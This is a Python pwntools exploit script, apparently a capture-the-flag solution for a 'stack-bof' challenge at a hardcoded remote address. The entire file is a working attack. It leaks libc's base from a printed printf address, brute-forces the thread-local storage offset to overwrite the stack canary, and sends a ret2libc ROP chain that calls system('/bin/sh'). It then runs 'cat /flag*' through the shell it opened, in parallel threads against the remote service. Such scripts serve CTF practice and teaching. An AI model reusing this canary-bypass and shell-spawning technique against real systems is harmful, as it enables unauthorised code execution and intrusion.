#!/usr/bin/env python3
import concurrent.futures
import os
import random

from pwn import *


DEFAULT_HOST = "35.194.108.145"
DEFAULT_PORT = 26639

EXE = "./stack-bof/stack-bof"
EXACT_LIBC = "/tmp/stackbof-libc.so.6"
EXACT_LD = "/tmp/stackbof-ld.so"
EXACT_LIBDIR = "/tmp/stackbof-runtime"
HOST_LIBC = "/usr/lib/x86_64-linux-gnu/libc.so.6"

# The local Ubuntu 24.04 runtime usually places TLS at libc_base + (page_delta |
# 0x740), but a wider brute is needed against the live pwn.red jail.
TLS_DELTA_START = 0x740
TLS_DELTA_END = 0x1000740
TLS_DELTA_STEP = 0x1000
NEGATIVE_TLS_DELTAS = [-0x28C0]

NEW_CANARY = 0x4242424241414141
RETRIES_PER_DELTA = 3


def ensure_exact_runtime() -> str:
    os.makedirs(EXACT_LIBDIR, exist_ok=True)

    links = {
        os.path.join(EXACT_LIBDIR, "libc.so.6"): EXACT_LIBC,
        os.path.join(EXACT_LIBDIR, "ld-linux-x86-64.so.2"): EXACT_LD,
    }

    for link_path, target in links.items():
        if not os.path.exists(target):
            raise FileNotFoundError(target)
        if os.path.islink(link_path) and os.path.realpath(link_path) == target:
            continue
        if os.path.lexists(link_path):
            os.unlink(link_path)
        os.symlink(target, link_path)

    return EXACT_LIBDIR


def build_runtime():
    if args.REMOTE:
        return None
    if args.EXACT:
        return [EXACT_LD, "--library-path", ensure_exact_runtime(), EXE]
    return [EXE]


def start():
    host = args.HOST or DEFAULT_HOST
    port = int(args.PORT or DEFAULT_PORT)
    if args.REMOTE:
        return remote(host, port)
    return process(build_runtime())


def make_payload(libc_base: int, gadgets: dict[str, int]) -> bytes:
    pop_rdi = libc_base + gadgets["pop_rdi"]
    ret = libc_base + gadgets["ret"]
    bin_sh = libc_base + gadgets["bin_sh"]
    system = libc_base + gadgets["system"]
    exit_ = libc_base + gadgets["exit"]

    chain = [
        ret,
        pop_rdi,
        bin_sh,
        system,
        exit_,
    ]

    payload = b"A" * 8
    payload += p64(NEW_CANARY)
    payload += b"B" * 8
    payload += b"".join(p64(x) for x in chain)

    if b"\n" in payload:
        raise ValueError("payload contains newline byte")

    return payload


def try_delta(delta: int, libc: ELF, gadgets: dict[str, int]) -> bytes | None:
    with context.local(log_level="critical"):
        io = start()
        try:
            line = io.recvline(timeout=2)
            if not line.startswith(b"printf: "):
                return None

            printf_addr = int(line.split()[-1], 16)
            libc_base = printf_addr - libc.sym["printf"]

            payload = make_payload(libc_base, gadgets)
            tls_guess = libc_base + delta

            io.send(p64(tls_guess + 0x28))
            io.send(p64(NEW_CANARY))
            io.sendline(payload)
            io.sendline(b"echo __PWNED__ ; cat /flag* ; exit")

            data = io.recvrepeat(0.5)
            if b"__PWNED__" not in data:
                return None
            return data
        except EOFError:
            return None
        finally:
            io.close()


def run_delta(delta: int, libc: ELF, gadgets: dict[str, int]) -> tuple[int, bytes] | None:
    for _ in range(RETRIES_PER_DELTA):
        try:
            data = try_delta(delta, libc, gadgets)
        except ValueError:
            continue
        if data is not None:
            return delta, data
    return None


def main():
    context.binary = exe = ELF(EXE, checksec=False)
    libc_path = EXACT_LIBC if os.path.exists(EXACT_LIBC) else HOST_LIBC
    libc = ELF(libc_path, checksec=False)
    context.log_level = "critical"
    rop = ROP(libc)
    gadgets = {
        "pop_rdi": rop.find_gadget(["pop rdi", "ret"])[0],
        "ret": rop.find_gadget(["ret"])[0],
        "bin_sh": next(libc.search(b"/bin/sh\x00")),
        "system": libc.sym["system"],
        "exit": libc.sym["exit"],
    }

    deltas = NEGATIVE_TLS_DELTAS + list(range(TLS_DELTA_START, TLS_DELTA_END, TLS_DELTA_STEP))
    random.Random(0x5A11).shuffle(deltas)
    workers = int(args.WORKERS or 1)
    if workers == 1:
        for delta in deltas:
            result = run_delta(delta, libc, gadgets)
            if result is None:
                continue
            _, data = result
            print(data.decode("latin-1", errors="replace"))
            return
    else:
        pool = concurrent.futures.ThreadPoolExecutor(max_workers=workers)
        try:
            futures = [pool.submit(run_delta, delta, libc, gadgets) for delta in deltas]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result is None:
                    continue
                _, data = result
                pool.shutdown(wait=False, cancel_futures=True)
                print(data.decode("latin-1", errors="replace"))
                return
        finally:
            pool.shutdown(wait=False, cancel_futures=True)

    raise SystemExit("no working TLS delta found")


if __name__ == "__main__":
    main()
